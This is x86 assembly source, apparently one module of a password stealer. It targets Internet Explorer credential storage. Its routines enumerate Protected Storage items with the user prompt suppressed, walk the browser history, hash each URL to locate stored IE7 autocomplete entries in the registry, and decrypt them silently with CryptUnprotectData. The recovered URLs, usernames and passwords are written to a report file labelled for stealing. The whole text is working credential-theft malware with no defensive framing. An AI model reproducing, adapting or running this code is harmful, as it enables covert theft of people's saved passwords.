PST_KEY_CURRENT_USER equ 0      ; Specifies that the storage is maintained in the current user section of the registry.
PST_KEY_LOCAL_MACHINE equ 1     ; Specifies that the storage is maintained in the local machine section of the registry.

; Specifies whether the prompt dialog is shown. This flag is ignored in Windows XP.
PST_PF_ALWAYS_SHOW equ 1        ; Requests that the provider show the prompt dialog to the user even if not required for this access.
PST_PF_NEVER_SHOW equ 2         ; Do not show the prompt dialog to the user.

; IPStore Interface
IPStore struct DWORD
       IPStore_QueryInterface           comethod3       ?
       IPStore_AddRef                   comethod1       ?
       IPStore_Release                  comethod1       ?
       IPStore_GetInfo                  comethod2       ?
       IPStore_GetProvParam             comethod5       ?
       IPStore_SetProvParam             comethod5       ?
       IPStore_CreateType               comethod5       ?
       IPStore_GetTypeInfo              comethod5       ?
       IPStore_DeleteType               comethod4       ?
       IPStore_CreateSubtype            comethod7       ?
       IPStore_GetSubtypeInfo           comethod6       ?
       IPStore_DeleteSubtype            comethod5       ?
       IPStore_ReadAccessRuleset        comethod6       ?
       IPStore_WriteAccessRuleset       comethod6       ?
       IPStore_EnumTypes                comethod4       ?
       IPStore_EnumSubtypes             comethod5       ?
       IPStore_DeleteItem               comethod7       ?
       IPStore_ReadItem                 comethod9       ?
       IPStore_WriteItem                comethod10      ?
       IPStore_OpenItem                 comethod8       ?
       IPStore_CloseItem                comethod6       ?
       IPStore_EnumItems                comethod6       ?
IPStore ends

; IEnumPStoreTypes/IEnumPStoreItems Interface (there's difference in 
; pointer type of ::Next function only)
IEnumPStoreTypes struct DWORD
       IEnumPStoreTypes_QueryInterface  comethod3       ?
       IEnumPStoreTypes_AddRef          comethod1       ?
       IEnumPStoreTypes_Release         comethod1       ?
       IEnumPStoreTypes_Next            comethod4       ?
       IEnumPStoreTypes_Skip            comethod2       ?
       IEnumPStoreTypes_Reset           comethod1       ?
       IEnumPStoreTypes_Clone           comethod2       ?
IEnumPStoreTypes ends

; Used while reading item data
_PST_PROMPTINFO struct
        cbSize                          DWORD           ?
        dwPromptFlags                   DWORD           ?
        hwndApp                         DWORD           ?
        szPrompt                        DWORD           ?
_PST_PROMPTINFO ends

coinvoke MACRO pInterface:REQ, Interface:REQ, Function:REQ, args:VARARG
    LOCAL istatement, arg
    FOR arg, <args>     ;; run thru args to see if edx is lurking in there
        IFIDNI <&arg>, <edx>
            .ERR <edx is not allowed as a coinvoke parameter>
        ENDIF
    ENDM
    IFIDNI <&pInterface>, <edx>
        .ERR <edx is not allowed as a coinvoke parameter>
    ENDIF
    istatement CATSTR <invoke (Interface PTR[edx]).&Interface>,<_>,<&Function, pInterface>
    IFNB <args>     ;; add the list of parameter arguments if any
        istatement CATSTR istatement, <, >, <&args> 
    ENDIF 
    mov edx, pInterface
    mov edx, [edx]
    istatement
ENDM

STATURL struc
     cbSize              dd    ?
     pwcsUrl             dd    ?
     pwcsTitle           dd    ?
     ftLastVisited       FILETIME <>
     ftLastUpdated       FILETIME <>
     ftExpires           FILETIME <>
     dwFlags             dd    ?
STATURL ends

     CALG_SHA            equ   00008004h
     
.data?
     su                  STATURL <>
     tail                db    ?
     align 4
     UnknownInteg        dd    ?
     ppnew               dd    ?
     ppnew2              dd    ?
     ppv                 dd    ?
     hProv               dd    ?
     hHash               dd    ?
     dwHashLen           dd    ?
     URL                 db    800h dup (?)
     IETmpBuf1           db    100h dup (?)
     IETmpBuf2           db    100h dup (?)
     IETmpBuf3           db    200h dup (?)
     HashBuf             db    20h dup (?)
     HashString          db    40h dup (?)
     SmallStr4           db    4 dup (?)
     DataIn              DATA_BLOB <>
     DataOut             DATA_BLOB <>
     OptionalEntropy     DATA_BLOB <>
     ; ie6
     ie6_datasize        dd    ?
     hIE6_lib            dd    ?
     ppProvider          dd    ?
     ie6_value           db    200h dup (?)
     
.code

GetIEPwd proc
      LOCAL   WTF:DWORD
      LOCAL   LocalSizeOfData :DWORD
      
      mov     dword ptr [LocalSizeOfData], 0
      mov     dword ptr [stbuf], IE_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
     
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetIEPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      call    GetIE7Pwd
      add     dword ptr [LocalSizeOfData], eax
      call    GetIE6Pwd
      add     dword ptr [LocalSizeOfData], eax
      
    GetIEPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
     
      WriteFile, stfile, addr LocalSizeOfData, sizeof LocalSizeOfData, addr SNW, NULL
      mov     eax, dword ptr [LocalSizeOfData] ; return actual size of written data
      ret
GetIEPwd endp

GetIE6Pwd proc
     
     mov     dword ptr [ie6_datasize], 0
     
     call    GetIEFromPStorage
     
     mov     eax, dword ptr [ie6_datasize]
     ret
GetIE6Pwd endp

GetIEFromPStorage proc
      LoadLibrary, addr szPSDLLName
      test    eax, eax
      je      ie6_bad_shit
      mov     hIE6_lib, eax
      GetProcAddress, hIE6_lib, addr szPSFuncName
      test    eax, eax
      je      ie6_free_lib
      
      xor     ecx, ecx
      push    ecx
      push    ecx
      push    ecx
      lea     edx, ppProvider
      push    edx
      call    eax
      
      test    eax, eax
      jnz     ie6_free_lib
      
      call    ReadPSTypes
      
    ie6_free_lib:
      FreeLibrary, addr hIE6_lib
    ie6_bad_shit:
      ret
GetIEFromPStorage endp

; Convert pType GUID to readable string in lpBuf
GetTypeName proc pType, lpBuf: DWORD
        LOCAL   pst: DWORD
        coinvoke ppProvider, IPStore, GetTypeInfo, 0, pType, addr pst, 0
        test    eax, eax
        jnz     @ret
        mov     edx, pst
        WideCharToMultiByte, CP_ACP, 0, [edx+4], -1, lpBuf, 1024, NULL, NULL
        push    dword ptr [pst]
        call    _CoTaskMemFree
@ret:
        ret
GetTypeName endp

; Convert pType & pSubtype GUIDs to readable string in lpBuf
GetSubtypeName proc pType, pSubtype, lpBuf: DWORD
        LOCAL   pst: DWORD
        coinvoke ppProvider, IPStore, GetSubtypeInfo, 0, pType, pSubtype, addr pst, 0
        test    eax, eax
        jnz     @ret
        mov     edx, pst
        WideCharToMultiByte, CP_ACP, 0, [edx+4], -1, lpBuf, 1024, NULL, NULL
        push    dword ptr [pst]
        call    _CoTaskMemFree
@ret:
        ret
GetSubtypeName endp

; #########################################################################

ReadPSItemValue proc uses esi edi ebx pType, pSubtype, pItem: DWORD
        LOCAL   szType[1024]: BYTE
        LOCAL   szSubtype[1024]: BYTE
        LOCAL   szItem[1024]: BYTE
        LOCAL   pspi: _PST_PROMPTINFO
        LOCAL   pData, pNewData, pDataLen: DWORD
        ; Convert UNICODE names to ASCII
        invoke  GetTypeName, pType, addr szType
        invoke  GetSubtypeName, pType, pSubtype, addr szSubtype
        WideCharToMultiByte, CP_ACP, 0, pItem, -1, addr szItem, 1024, NULL, NULL
        ; Set prompt info structure
        mov     pspi.cbSize, sizeof _PST_PROMPTINFO
        mov     pspi.dwPromptFlags, PST_PF_NEVER_SHOW
        mov     pspi.hwndApp, 0
        mov     pspi.szPrompt, 0
        ; pData pointer is allocated automaticly and should be freed using 
        ; CoTaskMemFree function
        coinvoke ppProvider, IPStore, ReadItem, 0, pType, pSubtype, pItem, addr pDataLen, addr pData, addr pspi, 0
        cmp     pDataLen, 0
        jz      @ret
        cmp     pData, 0
        jz      @ret
        
        ; Autocomplete passwords
        lstrcmpi, addr szType, offset szPExplorer
        .IF     eax == 0
                lstrcmpi, addr szSubtype, offset szPExplorer
                .IF     eax == 0
                        lea     esi, szItem
                        .IF     dword ptr[esi] == 'ptth'
                                lstrlen, addr szItem
                                cmp     dword ptr[esi+eax-4], 'ataD'
                                jne     @F
                                mov     eax, dword ptr [pData]
                                mov     dword ptr [pNewData], eax
                                
                                ;cut ":StringData"
                                lstrlen, addr szItem
                                mov     ecx, eax
                              ie6_strip_lp:
                                lea     eax, szItem
                                dec     eax
                                add     eax, ecx
                                cmp     byte ptr [eax], ':'
                                jne     no_ie6_strip
                                mov     byte ptr [eax], 0
                                jmp     already_stripped
                              no_ie6_strip:
                                dec     ecx
                                jnz     ie6_strip_lp
                              already_stripped:
                                
                                lstrlen, addr szItem
                                mov     dword ptr [plen], eax
                                add     dword ptr [ie6_datasize], sizeof plen
                                add     dword ptr [ie6_datasize], eax
                                WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
                                mov     byte ptr [data_type], REPORT_DATA_URL
                                add     dword ptr [ie6_datasize], sizeof data_type
                                WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
                                WriteFile, stfile, addr szItem, plen, addr SNW, NULL
                                
                                xor     ebx, ebx
                              ie6_one_more_item:
                                WideCharToMultiByte, CP_ACP, 0, pNewData, -1, addr ie6_value, MAX_PATH, NULL, NULL
                                imul    eax, eax, 2
                                add     dword ptr [pNewData], eax
                                
                                lstrlen, addr ie6_value
                                mov     dword ptr [plen], eax
                                add     dword ptr [ie6_datasize], sizeof plen
                                add     dword ptr [ie6_datasize], eax
                                WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
                                mov     byte ptr [data_type], REPORT_DATA_UKWN
                                add     dword ptr [ie6_datasize], sizeof data_type
                                WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
                                WriteFile, stfile, addr ie6_value, plen, addr SNW, NULL
                                
                                inc     ebx
                                
                                mov     eax, dword ptr [pData]
                                add     eax, dword ptr [pDataLen]
                                cmp     eax, dword ptr [pNewData]
                                jg      ie6_one_more_item
                                
                                jmp     @free
@@:
                        .ENDIF
                .ENDIF
        .ENDIF
@free:
        push    dword ptr [pData]
        call    _CoTaskMemFree
@ret:
        ret
ReadPSItemValue endp

ReadPSItems proc uses esi edi pType, pSubtype: DWORD
        LOCAL   WSTRBuf[16]: DWORD
        LOCAL   ppEnum, celtfetched: DWORD
        coinvoke ppProvider, IPStore, EnumItems, 0, pType, pSubtype, 0, addr ppEnum
        test    eax, eax
        jnz     @ret
@loop:
        ; Here should be IEnumPStoreItems, but it is similar to IEnumPStoreTypes
        ; so I do not use it
        coinvoke ppEnum, IEnumPStoreTypes, Next, 16, addr WSTRBuf, addr celtfetched
        cmp     celtfetched, 0
        jz      @release
        ; Enumerated Items are in WSTRBuf now
        lea     edi, WSTRBuf
        mov     esi, celtfetched
@inner_loop:
        invoke  ReadPSItemValue, pType, pSubtype, [edi]
        ; Free memory
        push    dword ptr [edi]
        call    _CoTaskMemFree
        add     edi, 4
        dec     esi
        jnz     @inner_loop
        jmp     @loop
@release:
        ; Release interface
        coinvoke ppEnum, IEnumPStoreTypes, Release
@ret:
        ret
ReadPSItems endp

ReadPSSubtypes proc uses esi edi pType: DWORD
        LOCAL   GUIDBuf[16]: GUID
        LOCAL   ppEnum, celtfetched: DWORD
        ; Get IEnumPStoreTypes interface
        coinvoke ppProvider, IPStore, EnumSubtypes, 0, pType, 0, addr ppEnum
        test    eax, eax
        jnz     @ret
@loop:  
        coinvoke ppEnum, IEnumPStoreTypes, Next, 16, addr GUIDBuf, addr celtfetched
        cmp     celtfetched, 0
        jz      @release
        ; Enumerated Subtypes are in GUIDBuf now
        ; For each type enumerate subtypes
        lea     edi, GUIDBuf
        mov     esi, celtfetched
@inner_loop:
        invoke  ReadPSItems, pType, edi
        add     edi, sizeof GUID
        dec     esi
        jnz     @inner_loop
        jmp     @loop
@release:
        ; Release interface
        coinvoke ppEnum, IEnumPStoreTypes, Release
@ret:
        ret
ReadPSSubtypes endp

ReadPSTypes proc uses esi edi
        LOCAL   GUIDBuf[16]: GUID
        LOCAL   ppEnum, celtfetched: DWORD
        ; Get IEnumPStoreTypes interface
        coinvoke ppProvider, IPStore, EnumTypes, 0, 0, addr ppEnum
        test    eax, eax
        jnz     @ret
@loop:  
        coinvoke ppEnum, IEnumPStoreTypes, Next, 16, addr GUIDBuf, addr celtfetched
        cmp     celtfetched, 0
        jz      @release
        ; Enumerated types are in GUIDBuf now
        ; For each type enumerate subtypes
        lea     edi, GUIDBuf
        mov     esi, celtfetched
@inner_loop:
        invoke  ReadPSSubtypes, edi
        add     edi, sizeof GUID
        dec     esi
        jnz     @inner_loop
        jmp     @loop
@release:
        ; Release interface
        coinvoke ppEnum, IEnumPStoreTypes, Release
@ret:
        ret
ReadPSTypes endp

GetIE7Pwd proc
     LOCAL   IECryptBufLen :DWORD
     LOCAL   hIECryptBuf :DWORD
     LOCAL   headersize :DWORD
     LOCAL   pointinfo :DWORD
     LOCAL   MaxData :DWORD
     LOCAL   ooffset :DWORD
     LOCAL   datalen :DWORD
     LOCAL   hkey :DWORD
     LOCAL   Datasize :DWORD
     
     mov     dword ptr [DataSize], 0
     
     push    0
     call    dword ptr [_CoInitialize]
     push    offset ppv
     push    offset IID_IUrlHistoryStg2
     push    CLSCTX_INPROC_SERVER
     push    0
     push    offset CLSID_CUrlHistory
     call    dword ptr [_CoCreateInstance]
     test    eax, eax
     jne     com_create_fail
     
     lea     eax, hkey
     push    eax
     push    KEY_READ or KEY_WOW64_64KEY
     push    0
     push    offset ie_regpath1
     push    HKEY_CURRENT_USER
     call    dword ptr [_RegOpenKeyEx]
     test    eax, eax
     jne     ie_reg_open_failed
     
     push    CRYPT_VERIFYCONTEXT
     push    PROV_RSA_FULL
     push    0
     push    0
     push    offset hProv
     call    dword ptr [_CryptAcquireContext]
     test    eax, eax
     je      enum_hist_end
     
     push    offset ppnew
     mov     eax, dword ptr [ppv]
     push    eax
     mov     eax, dword ptr [eax]
     call    dword ptr [eax+1Ch]
     
     push    0
     push    offset ppnew2
     mov     eax, dword ptr [ppnew]
     push    eax
     mov     eax, dword ptr [eax]
     call    dword ptr [eax+1Ch]
     
enum_hist_lp:
     push    offset UnknownInteg
     push    offset su
     push    01h
     mov     eax, dword ptr [ppnew]
     push    eax
     mov     eax, dword ptr [eax]
     call    dword ptr [eax+0Ch]
     test    eax, eax
     jne     enum_hist_end
     
     mov     eax, dword ptr [su.pwcsUrl]
     lstrcpyW, addr URL, eax
     ;strpos unicode
     lstrlenW, addr URL
     imul    eax, eax, 2
     mov     ecx, eax
     mov     esi, offset URL
     mov     dx, 003Fh
strposU_lp:
     mov     ax, word ptr [esi]
     inc     esi
     cmp     ax, dx
     je      strpos_done
     dec     ecx
     jnz     strposU_lp
strpos_done:
     mov     word ptr [esi-1], 0
no_zv:
     ; hash string
     mov     byte ptr [tail], 0
     mov     byte ptr [HashString], 0
     push    offset hHash
     push    0
     push    0
     push    CALG_SHA
     push    dword ptr [hProv]
     call    dword ptr [_CryptCreateHash]
     test    eax, eax
     je      oshit_gettin_hash
     lstrlenW, addr URL
     add     eax, 1
     imul    eax, eax, 2
     push    0
     push    eax
     push    offset URL
     push    dword ptr [hHash]
     call    dword ptr [_CryptHashData]
     test    eax, eax
     je      oshit_gettin_hash
     mov     dword ptr [dwHashLen], sizeof HashBuf
     push    0
     push    offset dwHashLen
     push    offset HashBuf
     push    HP_HASHVAL
     push    dword ptr [hHash]
     call    dword ptr [_CryptGetHashParam]
     test    eax, eax
     je      oshit_gettin_hash
     mov     ecx, 20
     mov     esi, offset HashBuf
enum_hash_bytes_lp:
     push    ecx
     xor     eax, eax
     lodsb
     add     byte ptr [tail], al
     push    eax
     push    offset IEformat_str
     push    offset SmallStr4
     call    wsprintf
     add     esp, 3*4
     lstrcat, addr HashString, addr SmallStr4
     pop     ecx
     dec     ecx
     jnz     enum_hash_bytes_lp
     
     movzx   eax, byte ptr [tail]
     push    eax
     push    offset IEformat_str
     push    offset SmallStr4
     call    wsprintf
     add     esp, 3*4
     lstrcat, addr HashString, addr SmallStr4
     push    dword ptr [hHash]
     call    dword ptr [_CryptDestroyHash]
     
     lea     eax, IECryptBufLen
     push    eax
     xor     eax, eax
     push    eax
     push    eax
     push    eax
     push    offset HashString
     push    dword ptr [hkey]
     call    dword ptr [_RegQueryValueEx]
     test    eax, eax
     jne     oshit_gettin_hash
     VirtualAlloc, 0, IECryptBufLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
     test    eax, eax
     je      oshit_gettin_hash
     mov     hIECryptBuf, eax
     lea     eax, IECryptBufLen
     push    eax
     push    dword ptr [hIECryptBuf]
     push    0
     push    0
     push    offset HashString
     push    dword ptr [hkey]
     call    dword ptr [_RegQueryValueEx]
     test    eax, eax
     jne     ie_get_shit
     
     mov     eax, dword ptr [IECryptBufLen]
     mov     dword ptr [DataIn.cbSize], eax
     mov     eax, dword ptr [hIECryptBuf]
     mov     dword ptr [DataIn.pData], eax
     mov     dword ptr [OptionalEntropy.pData], offset URL
     lstrlenW, addr URL
     add     eax, 1
     imul    eax, eax, 2
     mov     dword ptr [OptionalEntropy.cbSize], eax
     push    offset DataOut
     push    CRYPTPROTECT_UI_FORBIDDEN
     push    0
     push    0
     push    offset OptionalEntropy
     push    0
     push    offset DataIn
     call    dword ptr [_CryptUnprotectData]
     test    eax, eax
     je      ie_get_shit
     
     mov     ecx, dword ptr [DataOut.pData]
     mov     eax, dword ptr [ecx+04h]
     mov     dword ptr [headersize], eax
     mov     eax, dword ptr [ecx+08h]
     mov     dword ptr [Datasize], eax
     mov     eax, dword ptr [ecx+14h]
     mov     dword ptr [MaxData], eax
     mov     eax, ecx
     add     eax, 24h
     mov     dword ptr [pointinfo], eax
     
     WideCharToMultiByte, CP_ACP, 0, addr URL, -1, addr IETmpBuf1, MAX_PATH, NULL, NULL
     lstrlen, addr IETmpBuf1
     mov     dword ptr [plen], eax
     add     dword ptr [DataSize], sizeof plen
     add     dword ptr [DataSize], eax
     WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
     mov     byte ptr [data_type], REPORT_DATA_URL
     add     dword ptr [DataSize], sizeof data_type
     WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
     WriteFile, stfile, addr IETmpBuf1, plen, addr SNW, NULL
     
     mov     ecx, dword ptr MaxData
ie_parse_lp:
     push    ecx
     mov     edx, dword ptr [pointinfo]
     mov     eax, dword ptr [edx]
     add     eax, 0Ch
     add     eax, dword ptr [headersize]
     add     eax, dword ptr [DataOut.pData]
     mov     dword ptr [ooffset], eax
     mov     eax, dword ptr [edx+0Ch]
     mov     dword ptr [datalen], eax
     lstrcpyW, addr IETmpBuf3, ooffset
     WideCharToMultiByte, CP_ACP, 0, addr IETmpBuf3, -1, addr IETmpBuf1, MAX_PATH, NULL, NULL
     lstrlen, addr IETmpBuf1
     mov     dword ptr [plen], eax
     add     dword ptr [DataSize], sizeof plen
     add     dword ptr [DataSize], eax
     WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
     mov     byte ptr [data_type], REPORT_DATA_UKWN
     add     dword ptr [DataSize], sizeof data_type
     WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
     WriteFile, stfile, addr IETmpBuf1, plen, addr SNW, NULL
     add     dword ptr [pointinfo], 10h
     pop     ecx
     dec     ecx
     jne     ie_parse_lp
ie_get_shit:
     VirtualFree, hIECryptBuf, 0, MEM_RELEASE
oshit_gettin_hash:
     jmp     enum_hist_lp
     
enum_hist_end:
     push    0
     push    dword ptr [hProv]
     call    dword ptr [_CryptReleaseContext]
ie_reg_open_failed:
     push    dword ptr [hkey]
     call    dword ptr [_RegCloseKey]
com_create_fail:
     call    dword ptr [_CoUninitialize]
     
     mov     eax, dword ptr [DataSize]
     
     ret
GetIE7Pwd endp
